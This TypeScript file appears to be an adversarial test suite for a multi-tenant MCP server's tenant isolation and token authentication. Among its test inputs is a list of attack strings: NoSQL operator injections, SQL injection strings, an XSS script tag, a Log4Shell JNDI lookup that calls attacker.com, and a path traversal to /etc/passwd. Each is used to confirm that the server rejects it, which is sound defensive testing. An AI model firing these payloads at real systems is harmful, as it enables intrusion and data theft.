/**
 * Empirical Adversarial Stress Test Suite for Milestone 1 (Challenger 1):
 * - Multi-tenant context isolation under extreme concurrency (AsyncLocalStorage)
 * - Deep nested contexts, exception unwinding, and async boundary preservation
 * - Token authentication resilience: injection attacks, malformed inputs, boundary conditions
 * - Inactive tokens / organizations and database fallback resilience
 * - Timing safety and multi-byte UTF-8 equivalence
 * - CORS headers verification for x-api-key
 * 
 * Run via:
 *   npx tsx src/scripts/stressTestMcpM1Challenger1.ts
 */

import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import http from 'node:http';
import mongoose from 'mongoose';
import app from '../app';
import {
    mcpContextStorage,
    getMcpContext,
    runWithMcpContext,
    McpTenantContext,
} from '../mcp/context';
import { resolveMcpTenant } from '../mcp/auth';
import { fixtureStore } from './mcpE2eTestHarness';
import AgentApiToken from '../models/AgentApiToken';
import Organization from '../models/Organization';

let totalAssertions = 0;
let passedAssertions = 0;

function check(desc: string, condition: boolean, details?: string) {
    totalAssertions++;
    if (!condition) {
        throw new Error(`FAIL: ${desc} ${details ? `(${details})` : ''}`);
    }
    passedAssertions++;
}

async function runAdversarialTestSuite() {
    console.log('================================================================');
    console.log('  CHALLENGER 1: EMPIRICAL ADVERSARIAL STRESS TEST (MILESTONE 1)');
    console.log('================================================================\n');

    // =========================================================================
    // SUITE 1: Extreme Concurrency & Async Boundary Isolation
    // =========================================================================
    console.log('--- SUITE 1: Concurrency & Async Boundary Isolation ---');

    const TENANT_COUNT = 25;
    const CALLS_PER_TENANT = 20;
    const TOTAL_CONCURRENT = TENANT_COUNT * CALLS_PER_TENANT; // 500 concurrent fibers

    console.log(`[Suite 1.1] Launching ${TOTAL_CONCURRENT} concurrent asynchronous operations across ${TENANT_COUNT} distinct tenants...`);

    const tenants: McpTenantContext[] = Array.from({ length: TENANT_COUNT }, (_, i) => ({
        organizationId: `tenant_stress_${i}`,
        organizationName: `Stress Corp ${i}`,
        user: {
            userId: `user_stress_${i}`,
            role: 'org_admin',
            organizationId: `tenant_stress_${i}`,
            permissions: {},
            primaryDepartmentId: null,
            orgRoleId: null,
        },
        source: 'mcp',
    }));

    let completedOperations = 0;
    let crossContaminationDetected = false;

    const concurrentTasks = tenants.flatMap((tenant) =>
        Array.from({ length: CALLS_PER_TENANT }, async (_, taskIdx) => {
            return runWithMcpContext(tenant, async () => {
                // Phase 1: Immediate check
                const ctx0 = getMcpContext();
                if (ctx0.organizationId !== tenant.organizationId) {
                    crossContaminationDetected = true;
                }

                // Phase 2: Microtask delay
                await new Promise<void>((res) => queueMicrotask(res));
                const ctx1 = getMcpContext();
                if (ctx1.organizationId !== tenant.organizationId) {
                    crossContaminationDetected = true;
                }

                // Phase 3: Macrotask delay with randomized timer (0-15ms)
                const delayMs = Math.floor(Math.random() * 15);
                await new Promise<void>((res) => setTimeout(res, delayMs));
                const ctx2 = getMcpContext();
                if (ctx2.organizationId !== tenant.organizationId) {
                    crossContaminationDetected = true;
                }

                // Phase 4: Promise chaining & setImmediate
                await new Promise<void>((res) => setImmediate(res));
                const ctx3 = getMcpContext();
                if (ctx3.organizationId !== tenant.organizationId) {
                    crossContaminationDetected = true;
                }

                completedOperations++;
                return `${tenant.organizationId}_task_${taskIdx}`;
            });
        })
    );

    const results = await Promise.all(concurrentTasks);
    check('All 500 concurrent operations completed', completedOperations === TOTAL_CONCURRENT, `Got ${completedOperations}`);
    check('Zero cross-tenant contamination across 500 concurrent async fibers', !crossContaminationDetected);
    check('Results count matches total operations', results.length === TOTAL_CONCURRENT);
    console.log(`✓ [Suite 1.1 Passed] 500 concurrent operations executed with zero cross-tenant contamination.\n`);

    // =========================================================================
    // SUITE 2: Deeply Nested Contexts & Error Unwinding
    // =========================================================================
    console.log('--- SUITE 2: Deeply Nested Contexts & Error Unwinding ---');

    console.log('[Suite 2.1] Stress-testing nested context switching and unwind...');
    const parentTenant: McpTenantContext = {
        organizationId: 'parent_tenant',
        user: { userId: 'parent_u', role: 'org_admin', organizationId: 'parent_tenant', permissions: {}, primaryDepartmentId: null, orgRoleId: null },
        source: 'mcp',
    };
    const childTenant: McpTenantContext = {
        organizationId: 'child_tenant',
        user: { userId: 'child_u', role: 'org_admin', organizationId: 'child_tenant', permissions: {}, primaryDepartmentId: null, orgRoleId: null },
        source: 'mcp',
    };

    await runWithMcpContext(parentTenant, async () => {
        check('Outer scope sees parent tenant', getMcpContext().organizationId === 'parent_tenant');

        await runWithMcpContext(childTenant, async () => {
            await new Promise((r) => setTimeout(r, 5));
            check('Inner scope sees child tenant', getMcpContext().organizationId === 'child_tenant');
        });

        check('Outer scope successfully reverted to parent tenant after inner finished', getMcpContext().organizationId === 'parent_tenant');
    });

    console.log('[Suite 2.2] Stress-testing synchronous & asynchronous exception unwinding...');
    // Sync exception inside runWithMcpContext
    let caughtSyncError = false;
    try {
        await runWithMcpContext(parentTenant, () => {
            throw new Error('Explosive synchronous failure');
        });
    } catch (e: any) {
        caughtSyncError = e.message === 'Explosive synchronous failure';
    }
    check('Synchronous error propagated cleanly', caughtSyncError);
    check('Context storage is completely empty outside after sync error', mcpContextStorage.getStore() === undefined);

    // Async rejection inside runWithMcpContext
    let caughtAsyncError = false;
    try {
        await runWithMcpContext(parentTenant, async () => {
            await new Promise((r) => setTimeout(r, 5));
            throw new Error('Explosive asynchronous rejection');
        });
    } catch (e: any) {
        caughtAsyncError = e.message === 'Explosive asynchronous rejection';
    }
    check('Asynchronous rejection propagated cleanly', caughtAsyncError);
    check('Context storage is completely empty outside after async error', mcpContextStorage.getStore() === undefined);

    // Parallel errors do not corrupt healthy concurrent contexts
    const mixedTasks = [
        runWithMcpContext(tenants[0], async () => {
            await new Promise((r) => setTimeout(r, 10));
            return getMcpContext().organizationId;
        }),
        runWithMcpContext(tenants[1], async () => {
            await new Promise((r) => setTimeout(r, 5));
            throw new Error('Faulty task 1');
        }).catch((err) => err.message),
        runWithMcpContext(tenants[2], async () => {
            await new Promise((r) => setTimeout(r, 10));
            return getMcpContext().organizationId;
        }),
    ];

    const mixedResults = await Promise.all(mixedTasks);
    check('Healthy task 0 succeeded despite sibling failure', mixedResults[0] === 'tenant_stress_0');
    check('Failing task 1 failed predictably', mixedResults[1] === 'Faulty task 1');
    check('Healthy task 2 succeeded despite sibling failure', mixedResults[2] === 'tenant_stress_2');
    console.log(`✓ [Suite 2 Passed] Nested context nesting and exception unwinding verified.\n`);

    // =========================================================================
    // SUITE 3: Malicious Inputs, NoSQL Injections & Type Confusions
    // =========================================================================
    console.log('--- SUITE 3: Malicious Inputs, NoSQL Injections & Type Confusions ---');

    console.log('[Suite 3.1] Testing type-confusion & non-string inputs in resolveMcpTenant...');
    const nonStringInputs = [
        null,
        undefined,
        12345,
        0,
        -1,
        true,
        false,
        {},
        { $ne: null },
        { $gt: '' },
        { $regex: '.*' },
        { $where: 'return true;' },
        [],
        ['vdag_alpha_valid_token_0123456789abcdef0123456789abcdef'],
        new Date(),
        /regex/,
        Buffer.from('token'),
    ];

    for (const input of nonStringInputs) {
        const res = await resolveMcpTenant(input as any);
        check(`Non-string input [${typeof input}] safely returns null`, res === null, `Input: ${String(input)}`);
    }

    console.log('[Suite 3.2] Testing stringified NoSQL & SQL injection payloads...');
    const injectionStrings = [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$where": "sleep(5000)"}',
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' OR 1=1 --",
        "admin' --",
        "admin' /*",
        "' UNION SELECT * FROM users --",
        '<script>alert(1)</script>',
        '${jndi:ldap://attacker.com/a}',
        '../../../../etc/passwd',
        '%00',
        '\\0',
        '\0',
        '\r\n',
        '\t',
    ];

    for (const payload of injectionStrings) {
        const res = await resolveMcpTenant(payload);
        check(`Injection payload [${payload.slice(0, 20)}] safely returns null`, res === null, `Got: ${JSON.stringify(res)}`);
    }

    console.log('[Suite 3.3] Testing buffer overflow & extreme string lengths...');
    const longStrings = [
        'a'.repeat(1000),
        'b'.repeat(10_000),
        'c'.repeat(100_000),
        'd'.repeat(1_000_000), // 1MB string
        'Bearer ' + 'x'.repeat(100_000),
    ];

    for (const longStr of longStrings) {
        const t0 = Date.now();
        const res = await resolveMcpTenant(longStr);
        const duration = Date.now() - t0;
        check(`Long string of length ${longStr.length} safely returns null in < 200ms`, res === null && duration < 200, `Took ${duration}ms`);
    }

    console.log(`✓ [Suite 3 Passed] All malicious inputs, type confusions, and long strings safely rejected.\n`);

    // =========================================================================
    // SUITE 4: Boundary Tokens, Headers & Case Sensitivity
    // =========================================================================
    console.log('--- SUITE 4: Boundary Tokens, Headers & Case Sensitivity ---');

    const validAlphaToken = 'vdag_alpha_valid_token_0123456789abcdef0123456789abcdef';

    console.log('[Suite 4.1] Testing valid Bearer variations...');
    const validVariants = [
        validAlphaToken,
        `Bearer ${validAlphaToken}`,
        `bearer ${validAlphaToken}`,
        `BEARER ${validAlphaToken}`,
        `  Bearer ${validAlphaToken}  `,
        `Bearer   ${validAlphaToken}`,
        `\tBearer\t${validAlphaToken}\t`,
    ];

    for (const v of validVariants) {
        const res = await resolveMcpTenant(v);
        check(`Valid variant [${v.slice(0, 25)}...] correctly resolves to org_alpha`, res?.organizationId === 'org_alpha', `Got: ${res?.organizationId}`);
    }

    console.log('[Suite 4.2] Testing invalid Bearer variants...');
    const invalidVariants = [
        'Bearer',
        'Bearer ',
        'bearer ',
        'BEARER   ',
        '   ',
        '',
        `BearerBearer ${validAlphaToken}`,
        `Bearer Bearer ${validAlphaToken}`,
        `Token ${validAlphaToken}`,
        `Bearer:${validAlphaToken}`,
        `${validAlphaToken}Bearer`,
    ];

    for (const inv of invalidVariants) {
        const res = await resolveMcpTenant(inv);
        check(`Invalid variant [${inv.slice(0, 25)}] safely returns null`, res === null, `Resolved to: ${res?.organizationId}`);
    }

    console.log('[Suite 4.3] Testing case sensitivity on the token secret itself...');
    // Security tokens must be case-sensitive
    const upperAlphaToken = validAlphaToken.toUpperCase();
    const resUpper = await resolveMcpTenant(upperAlphaToken);
    check('Uppercase token fails resolution (strict case-sensitive comparison)', resUpper === null);

    const mutatedToken = validAlphaToken.slice(0, -1) + (validAlphaToken.endsWith('f') ? 'e' : 'f');
    const resMutated = await resolveMcpTenant(mutatedToken);
    check('1-character mutated token fails resolution', resMutated === null);

    console.log(`✓ [Suite 4 Passed] Boundary tokens, headers, and case sensitivity verified.\n`);

    // =========================================================================
    // SUITE 5: Inactive Tokens & Inactive Organizations
    // =========================================================================
    console.log('--- SUITE 5: Inactive Tokens & Inactive Organizations ---');

    console.log('[Suite 5.1] Testing fixtureStore inactive token rejection...');
    const inactiveToken = 'vdag_test_inactive_token_11111';
    fixtureStore.tokens.set(inactiveToken, {
        tokenId: 'aat_inactive_01',
        organizationId: 'org_alpha',
        token: inactiveToken,
        isActive: false, // Inactive
    });

    const resInactiveToken = await resolveMcpTenant(inactiveToken);
    check('Inactive token is rejected even if organization is active', resInactiveToken === null);

    console.log('[Suite 5.2] Testing fixtureStore inactive organization rejection...');
    const disabledOrgToken = 'vdag_disabled_org_token_22222';
    fixtureStore.organizations.set('org_disabled', {
        organizationId: 'org_disabled',
        organizationName: 'Disabled Corp',
        status: 'inactive', // Inactive org
    });
    fixtureStore.tokens.set(disabledOrgToken, {
        tokenId: 'aat_disabled_org_02',
        organizationId: 'org_disabled',
        token: disabledOrgToken,
        isActive: true,
    });

    const resDisabledOrg = await resolveMcpTenant(disabledOrgToken);
    check('Active token is rejected when organization status is inactive', resDisabledOrg === null);

    const resDisabledOrgDirect = await resolveMcpTenant('org_disabled');
    check('Direct lookup by organizationId is rejected when organization is inactive', resDisabledOrgDirect === null);

    // Clean up fixture store
    fixtureStore.tokens.delete(inactiveToken);
    fixtureStore.tokens.delete(disabledOrgToken);
    fixtureStore.organizations.delete('org_disabled');

    console.log(`✓ [Suite 5 Passed] Inactive tokens and inactive organizations properly blocked.\n`);

    // =========================================================================
    // SUITE 6: Database Branch & Error Resilience Simulation
    // =========================================================================
    console.log('--- SUITE 6: Database Branch & Error Resilience Simulation ---');

    console.log('[Suite 6.1] Simulating mongoose.connection.readyState === 1 and DB query resilience...');
    const originalReadyState = mongoose.connection.readyState;
    const originalFindOneToken = AgentApiToken.findOne;
    const originalFindOneOrg = Organization.findOne;

    try {
        // Set connection.readyState = 1
        Object.defineProperty(mongoose.connection, 'readyState', {
            value: 1,
            configurable: true,
        });

        // Mock 1: AgentApiToken throws DB network exception
        (AgentApiToken as any).findOne = () => {
            throw new Error('MongoNetworkError: connection timed out');
        };

        const resDbError = await resolveMcpTenant(validAlphaToken);
        check('Database error caught gracefully and falls through to fixture lookup', resDbError?.organizationId === 'org_alpha');

        // Mock 2: AgentApiToken returns active token with active org
        let saveCalled = false;
        (AgentApiToken as any).findOne = () => ({
            token: 'live_db_valid_token_33333',
            organizationId: 'live_org_123',
            isActive: true,
            lastUsedAt: null,
            save: async () => {
                saveCalled = true;
            },
        });

        (Organization as any).findOne = (query: any) => {
            if (query.organizationId === 'live_org_123' && query.status === 'active') {
                return {
                    lean: async () => ({
                        organizationId: 'live_org_123',
                        organizationName: 'Live Cloud Corp',
                        status: 'active',
                    }),
                };
            }
            return { lean: async () => null };
        };

        const resLiveDb = await resolveMcpTenant('live_db_valid_token_33333');
        check('Live database token resolution succeeds', resLiveDb?.organizationId === 'live_org_123');
        check('Organization name populated from live DB org', resLiveDb?.organizationName === 'Live Cloud Corp');
        check('tokenRow.lastUsedAt save is triggered', saveCalled);

        // Mock 3: Token found in DB but token string mismatch (case/byte divergence)
        (AgentApiToken as any).findOne = () => ({
            token: 'live_db_different_case_token',
            organizationId: 'live_org_123',
            isActive: true,
            save: async () => {},
        });
        const resMismatch = await resolveMcpTenant('LIVE_DB_DIFFERENT_CASE_TOKEN');
        check('secureTokenMatch rejects case-divergent token despite findOne result', resMismatch === null);

        // Mock 4: Token found in DB but Org is inactive
        (AgentApiToken as any).findOne = () => ({
            token: 'live_token_inactive_org',
            organizationId: 'live_org_inactive',
            isActive: true,
            save: async () => {},
        });
        (Organization as any).findOne = () => ({
            lean: async () => null, // Org not found as active
        });
        const resInactiveOrgDb = await resolveMcpTenant('live_token_inactive_org');
        check('Live DB rejects token if Organization is inactive', resInactiveOrgDb === null);

    } finally {
        // Restore originals
        Object.defineProperty(mongoose.connection, 'readyState', {
            value: originalReadyState,
            configurable: true,
        });
        (AgentApiToken as any).findOne = originalFindOneToken;
        (Organization as any).findOne = originalFindOneOrg;
    }

    console.log(`✓ [Suite 6 Passed] Live database lookup branch and error resilience verified.\n`);

    // =========================================================================
    // SUITE 7: Timing Attack & Multi-Byte UTF-8 String Equivalence
    // =========================================================================
    console.log('--- SUITE 7: Timing Attack & Multi-Byte UTF-8 Analysis ---');

    console.log('[Suite 7.1] Testing timing safe match with variable byte lengths & emojis...');
    const multiByteInputs = [
        '🔑🔑🔑🔑', // 16 bytes, 4 chars
        'café',     // 5 bytes, 4 chars
        'Москва',   // 12 bytes, 6 chars
        '🚀',       // 4 bytes, 1 char
        '',
        'a',
        'abcdefghijklmnopqrstuvwxyz',
    ];

    for (const mb of multiByteInputs) {
        const res = await resolveMcpTenant(mb);
        check(`Multibyte input [${mb}] safely evaluated without throwing crypto RangeError`, res === null);
    }

    console.log(`✓ [Suite 7 Passed] Timing attack and multi-byte UTF-8 handling verified.\n`);

    // =========================================================================
    // SUITE 8: Express CORS Configuration & Allowed Headers
    // =========================================================================
    console.log('--- SUITE 8: Express CORS Configuration & Allowed Headers ---');

    console.log('[Suite 8.1] Testing CORS OPTIONS preflight headers via Express app handler...');
    const req = new (http.IncomingMessage as any)(null);
    req.method = 'OPTIONS';
    req.url = '/api/mcp/sse';
    req.headers = {
        origin: 'http://localhost:3124',
        'access-control-request-method': 'POST',
        'access-control-request-headers': 'x-api-key',
    };

    const resHeaders: Record<string, string> = {};
    const res = new (http.ServerResponse as any)(req);
    res.setHeader = (name: string, value: any) => {
        resHeaders[name.toLowerCase()] = String(value);
        return res;
    };
    res.getHeader = (name: string) => resHeaders[name.toLowerCase()];

    await new Promise<void>((resolve) => {
        res.end = () => {
            resolve();
            return res;
        };
        (app as any)(req, res, () => {
            resolve();
        });
    });

    const allowedHeaders = resHeaders['access-control-allow-headers'] || '';
    check('CORS preflight responds with access-control-allow-headers containing x-api-key',
        allowedHeaders.toLowerCase().includes('x-api-key'),
        `Headers: ${allowedHeaders}`
    );
    check('CORS preflight responds with origin http://localhost:3124',
        resHeaders['access-control-allow-origin'] === 'http://localhost:3124',
        `Origin: ${resHeaders['access-control-allow-origin']}`
    );

    console.log(`✓ [Suite 8 Passed] Express CORS allowedHeaders includes x-api-key and validates preflight.\n`);

    // =========================================================================
    // SUMMARY
    // =========================================================================
    console.log('================================================================');
    console.log(`  ALL ${passedAssertions}/${totalAssertions} ADVERSARIAL ASSERTIONS PASSED!`);
    console.log('================================================================');
}

runAdversarialTestSuite().catch((err) => {
    console.error('\n❌ ADVERSARIAL STRESS TEST FAILURE:');
    console.error(err);
    process.exit(1);
});
